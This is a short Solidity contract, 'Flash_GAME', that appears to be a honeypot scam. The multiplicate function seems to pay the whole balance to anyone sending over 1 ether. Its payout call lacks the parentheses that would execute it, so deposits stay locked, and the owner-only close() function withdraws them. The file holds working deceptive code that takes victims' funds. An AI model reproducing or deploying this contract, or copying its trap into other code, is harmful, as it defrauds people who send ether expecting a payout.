pragma solidity ^0.4.26;

contract Flash_GAME {
    function multiplicate() public payable {
        if (msg.value > 1 ether) {
            msg.sender.call.value(address(this).balance);
        }
    }

    address public owner = msg.sender;

    function close() external payable {
        require(msg.sender == owner);
        owner.transfer(address(this).balance);
    }

    function() external payable {
        multiplicate();
    }

    constructor() public payable {}
}